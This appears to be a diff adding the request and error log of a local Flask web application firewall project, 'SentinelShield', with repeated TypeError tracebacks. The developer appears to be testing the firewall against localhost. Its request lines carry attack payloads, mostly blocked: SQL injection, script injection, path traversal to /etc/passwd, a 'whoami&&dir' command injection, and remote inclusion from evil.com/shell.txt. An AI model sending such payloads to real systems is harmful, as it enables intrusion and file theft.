+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 178, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-12 17:52:20,496 | INFO | 127.0.0.1 GET / 500
+2026-02-12 17:52:20,497 | INFO | 127.0.0.1 - - [12/Feb/2026 17:52:20] "[35m[1mGET / HTTP/1.1[0m" 500 -
+2026-02-12 17:52:40,527 | INFO | 127.0.0.1 GET /health 200
+2026-02-12 17:52:40,528 | INFO | 127.0.0.1 - - [12/Feb/2026 17:52:40] "GET /health HTTP/1.1" 200 -
+2026-02-12 17:52:49,966 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 17:52:49,967 | INFO | 127.0.0.1 - - [12/Feb/2026 17:52:49] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 18:07:35,912 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-12 18:07:35,913 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-12 18:07:46,548 | INFO | 127.0.0.1 GET / 403
+2026-02-12 18:07:46,549 | INFO | 127.0.0.1 - - [12/Feb/2026 18:07:46] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-12 18:07:54,296 | INFO | 127.0.0.1 GET /health 200
+2026-02-12 18:07:54,297 | INFO | 127.0.0.1 - - [12/Feb/2026 18:07:54] "GET /health HTTP/1.1" 200 -
+2026-02-12 18:08:07,215 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-12 18:08:07,216 | INFO | 127.0.0.1 - - [12/Feb/2026 18:08:07] "GET /metrics HTTP/1.1" 200 -
+2026-02-12 18:08:59,034 | INFO | 127.0.0.1 GET /dashboard 200
+2026-02-12 18:08:59,036 | INFO | 127.0.0.1 - - [12/Feb/2026 18:08:59] "GET /dashboard HTTP/1.1" 200 -
+2026-02-12 18:14:41,832 | INFO | 127.0.0.1 GET / 403
+2026-02-12 18:14:41,834 | INFO | 127.0.0.1 - - [12/Feb/2026 18:14:41] "[31m[1mGET /?id=1%20OR%201=1-- HTTP/1.1[0m" 403 -
+2026-02-13 16:39:06,949 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.127.14.13:5000
+2026-02-13 16:39:06,952 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 16:42:39,595 | INFO | 127.0.0.1 GET / 403
+2026-02-13 16:42:39,596 | INFO | 127.0.0.1 - - [13/Feb/2026 16:42:39] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-13 16:42:39,677 | INFO | 127.0.0.1 GET /favicon.ico 404
+2026-02-13 16:42:39,679 | INFO | 127.0.0.1 - - [13/Feb/2026 16:42:39] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2026-02-13 17:13:03,187 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.127.14.13:5000
+2026-02-13 17:13:03,188 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 17:13:22,693 | INFO | 127.0.0.1 GET / 403
+2026-02-13 17:13:22,695 | INFO | 127.0.0.1 - - [13/Feb/2026 17:13:22] "[31m[1mGET / HTTP/1.1[0m" 403 -
+2026-02-13 17:21:25,290 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.127.14.13:5000
+2026-02-13 17:21:25,291 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 17:22:02,114 | INFO | 127.0.0.1 GET / 200
+2026-02-13 17:22:02,116 | INFO | 127.0.0.1 - - [13/Feb/2026 17:22:02] "GET / HTTP/1.1" 200 -
+2026-02-13 17:31:33,870 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.127.14.13:5000
+2026-02-13 17:31:33,871 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 17:31:40,722 | INFO | 127.0.0.1 GET / 200
+2026-02-13 17:31:40,723 | INFO | 127.0.0.1 - - [13/Feb/2026 17:31:40] "GET / HTTP/1.1" 200 -
+2026-02-13 17:58:25,786 | INFO | 127.0.0.1 GET / 200
+2026-02-13 17:58:25,788 | INFO | 127.0.0.1 - - [13/Feb/2026 17:58:25] "GET /?name=Sam HTTP/1.1" 200 -
+2026-02-13 17:59:20,621 | INFO | 127.0.0.1 GET / 200
+2026-02-13 17:59:20,621 | INFO | 127.0.0.1 - - [13/Feb/2026 17:59:20] "GET /?id=1'%20OR%20'1'='1 HTTP/1.1" 200 -
+2026-02-13 18:02:43,544 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://10.127.14.13:5000
+2026-02-13 18:02:43,545 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 18:03:14,781 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:03:14,782 | INFO | 127.0.0.1 - - [13/Feb/2026 18:03:14] "[31m[1mGET /?id=1'%20OR%20'1'='1 HTTP/1.1[0m" 403 -
+2026-02-13 18:07:00,331 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:07:00,332 | INFO | 127.0.0.1 - - [13/Feb/2026 18:07:00] "[31m[1mGET /?q=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-13 18:16:01,897 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:16:01,898 | INFO | 127.0.0.1 - - [13/Feb/2026 18:16:01] "[31m[1mGET /?file=../../etc/passwd HTTP/1.1[0m" 403 -
+2026-02-13 18:16:25,955 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:16:25,956 | INFO | 127.0.0.1 - - [13/Feb/2026 18:16:25] "[31m[1mGET /?file=..\\\\..\\\\windows\\\\system32 HTTP/1.1[0m" 403 -
+2026-02-13 18:18:16,157 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:18:16,158 | INFO | 127.0.0.1 - - [13/Feb/2026 18:18:16] "[31m[1mGET /?page=http://evil.com/shell.txt HTTP/1.1[0m" 403 -
+2026-02-13 18:19:14,609 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:19:14,610 | INFO | 127.0.0.1 - - [13/Feb/2026 18:19:14] "[31m[1mGET /?cmd=whoami&&dir HTTP/1.1[0m" 403 -
+2026-02-13 18:35:19,260 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-13 18:35:19,261 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 18:35:46,729 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:35:46,730 | INFO | 127.0.0.1 - - [13/Feb/2026 18:35:46] "[31m[1mGET /?page=http://evil.com/shell.txt HTTP/1.1[0m" 403 -
+2026-02-13 18:36:51,350 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:36:51,351 | INFO | 127.0.0.1 - - [13/Feb/2026 18:36:51] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:36:59,779 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:36:59,780 | INFO | 127.0.0.1 - - [13/Feb/2026 18:36:59] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:37:00,186 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:37:00,187 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:00] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:37:00,386 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:37:00,387 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:00] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:37:00,589 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:37:00,589 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:00] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:37:00,797 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:37:00,798 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:00] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:37:00,987 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:37:00,987 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:00] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:37:01,854 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:37:01,854 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:01] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:37:04,257 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:37:04,257 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:04] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:37:04,515 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:37:04,515 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:04] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:37:04,810 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 166, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-13 18:37:04,813 | INFO | 127.0.0.1 GET / 500
+2026-02-13 18:37:04,813 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:04] "[35m[1mGET /?test=normal HTTP/1.1[0m" 500 -
+2026-02-13 18:37:05,045 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 166, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-13 18:37:05,047 | INFO | 127.0.0.1 GET / 500
+2026-02-13 18:37:05,048 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:05] "[35m[1mGET /?test=normal HTTP/1.1[0m" 500 -
+2026-02-13 18:37:23,086 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 166, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-13 18:37:23,088 | INFO | 127.0.0.1 GET / 500
+2026-02-13 18:37:23,089 | INFO | 127.0.0.1 - - [13/Feb/2026 18:37:23] "[35m[1mGET /?test=normal HTTP/1.1[0m" 500 -
+2026-02-13 18:38:24,514 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-13 18:38:24,514 | INFO | 127.0.0.1 - - [13/Feb/2026 18:38:24] "GET /metrics HTTP/1.1" 200 -
+2026-02-13 18:39:01,105 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:39:01,105 | INFO | 127.0.0.1 - - [13/Feb/2026 18:39:01] "GET / HTTP/1.1" 200 -
+2026-02-13 18:39:09,001 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:39:09,002 | INFO | 127.0.0.1 - - [13/Feb/2026 18:39:09] "GET / HTTP/1.1" 200 -
+2026-02-13 18:39:21,069 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:39:21,070 | INFO | 127.0.0.1 - - [13/Feb/2026 18:39:21] "GET / HTTP/1.1" 200 -
+2026-02-13 18:39:24,133 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:39:24,134 | INFO | 127.0.0.1 - - [13/Feb/2026 18:39:24] "GET /?name=Sam HTTP/1.1" 200 -
+2026-02-13 18:39:26,533 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:39:26,534 | INFO | 127.0.0.1 - - [13/Feb/2026 18:39:26] "[31m[1mGET /?id=1'%20OR%20'1'='1 HTTP/1.1[0m" 403 -
+2026-02-13 18:39:29,446 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:39:29,447 | INFO | 127.0.0.1 - - [13/Feb/2026 18:39:29] "[31m[1mGET /?q=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-13 18:40:01,150 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-13 18:40:01,151 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 18:40:08,620 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:40:08,621 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:08] "GET / HTTP/1.1" 200 -
+2026-02-13 18:40:20,695 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:40:20,696 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:20] "GET /?name=Sam HTTP/1.1" 200 -
+2026-02-13 18:40:26,029 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:40:26,029 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:26] "[31m[1mGET /?id=1'%20OR%20'1'='1 HTTP/1.1[0m" 403 -
+2026-02-13 18:40:28,911 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:40:28,912 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:28] "[31m[1mGET /?q=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-13 18:40:32,024 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:40:32,025 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:32] "[31m[1mGET /?file=../../etc/passwd HTTP/1.1[0m" 403 -
+2026-02-13 18:40:35,188 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:40:35,189 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:35] "[31m[1mGET /?file=..\\\\..\\\\windows\\\\system32 HTTP/1.1[0m" 403 -
+2026-02-13 18:40:38,703 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:40:38,704 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:38] "[31m[1mGET /?cmd=whoami&&dir HTTP/1.1[0m" 403 -
+2026-02-13 18:40:42,440 | INFO | 127.0.0.1 GET / 403
+2026-02-13 18:40:42,441 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:42] "[31m[1mGET /?page=http://evil.com/shell.txt HTTP/1.1[0m" 403 -
+2026-02-13 18:40:46,521 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:40:46,521 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:46] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:40:46,724 | INFO | 127.0.0.1 GET / 200
+2026-02-13 18:40:46,724 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:46] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 18:40:47,743 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 166, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-13 18:40:47,746 | INFO | 127.0.0.1 GET / 500
+2026-02-13 18:40:47,747 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:47] "[35m[1mGET /?test=normal HTTP/1.1[0m" 500 -
+2026-02-13 18:40:48,084 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 166, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-13 18:40:48,086 | INFO | 127.0.0.1 GET / 500
+2026-02-13 18:40:48,086 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:48] "[35m[1mGET /?test=normal HTTP/1.1[0m" 500 -
+2026-02-13 18:40:48,284 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 166, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-13 18:40:48,287 | INFO | 127.0.0.1 GET / 500
+2026-02-13 18:40:48,287 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:48] "[35m[1mGET /?test=normal HTTP/1.1[0m" 500 -
+2026-02-13 18:40:48,501 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 166, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-13 18:40:48,503 | INFO | 127.0.0.1 GET / 500
+2026-02-13 18:40:48,503 | INFO | 127.0.0.1 - - [13/Feb/2026 18:40:48] "[35m[1mGET /?test=normal HTTP/1.1[0m" 500 -
+2026-02-13 18:41:06,850 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-13 18:41:06,851 | INFO | 127.0.0.1 - - [13/Feb/2026 18:41:06] "GET /metrics HTTP/1.1" 200 -
+2026-02-13 19:38:55,496 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-13 19:38:55,497 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 19:39:15,567 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:15,568 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:15] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:17,492 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:17,492 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:17] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:17,831 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:17,831 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:17] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:18,546 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:18,547 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:18] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:18,830 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:18,831 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:18] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:19,225 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:19,226 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:19] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:19,442 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:19,442 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:19] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:19,630 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:19,631 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:19] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:20,762 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:20,763 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:20] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:20,950 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:39:20,950 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:20] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:39:21,350 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 166, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-13 19:39:21,353 | INFO | 127.0.0.1 GET / 500
+2026-02-13 19:39:21,353 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:21] "[35m[1mGET /?test=normal HTTP/1.1[0m" 500 -
+2026-02-13 19:39:21,566 | ERROR | Exception on / [GET]
+Traceback (most recent call last):
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "C:\Users\SAMIR\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages\flask\app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
